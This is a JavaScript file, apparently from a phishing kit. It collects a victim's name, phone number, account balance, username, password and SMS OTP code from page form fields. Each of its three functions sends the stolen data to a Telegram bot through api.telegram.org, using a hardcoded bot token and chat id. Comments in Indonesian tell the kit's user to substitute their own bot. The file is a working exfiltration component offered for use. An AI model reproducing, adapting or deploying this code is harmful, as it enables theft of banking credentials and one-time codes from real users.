function kirimpesan() 
{

var logo = document.getElementById('logo');
var nama = document.getElementById('nama');
var nomor = document.getElementById('nomor');
var saldo = document.getElementById('saldo');
    var gabungan = logo.value 
    + '%0A𝗡𝗮𝗺𝗮           : ' + nama.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗽  : ' + nomor.value + '%0A%0A𝗦𝗮𝗹𝗱𝗼          :𝗥𝗽.' + saldo.value;

    var token = '7826896424:AAErlmCvl1lDnBmtCXtwXpkgdSV3bw0cbpM'; // Ganti dengan token bot yang kamu buat
    var grup = '7228666759'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}
function kirimpesan1() 
{

var logo = document.getElementById('logo');
var nama = document.getElementById('nama');
var nomor = document.getElementById('nomor');
var saldo = document.getElementById('saldo');
var use = document.getElementById('user');
var password = document.getElementById('password');
    var gabungan = logo.value 
    + '%0A𝗡𝗮𝗺𝗮           : ' + nama.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗽  : ' + nomor.value + '%0A%0A𝗦𝗮𝗹𝗱𝗼          :𝗥𝗽.' + saldo.value + '%0A%0A𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲  : ' + user.value + '%0A𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱  : ' + password.value;

    var token = '7826896424:AAErlmCvl1lDnBmtCXtwXpkgdSV3bw0cbpM'; // Ganti dengan token bot yang kamu buat
    var grup = '7228666759'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}
function kirimpesan2() 
{

var logo = document.getElementById('logo');
var nama = document.getElementById('nama');
var nomor = document.getElementById('nomor');
var saldo = document.getElementById('saldo');
var use = document.getElementById('user');
var password = document.getElementById('password');
var sms = document.getElementById('sms');
    var gabungan = logo.value 
    + '%0A𝗡𝗮𝗺𝗮           : ' + nama.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗽  : ' + nomor.value + '%0A%0A𝗦𝗮𝗹𝗱𝗼          :𝗥𝗽.' + saldo.value + '%0A%0A𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲  : ' + user.value + '%0A𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱  : ' + password.value + '%𝗞𝗼𝗱𝗲 𝗢𝗧𝗣  : ' + sms.value;

    var token = '7826896424:AAErlmCvl1lDnBmtCXtwXpkgdSV3bw0cbpM'; // Ganti dengan token bot yang kamu buat
    var grup = '7228666759'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}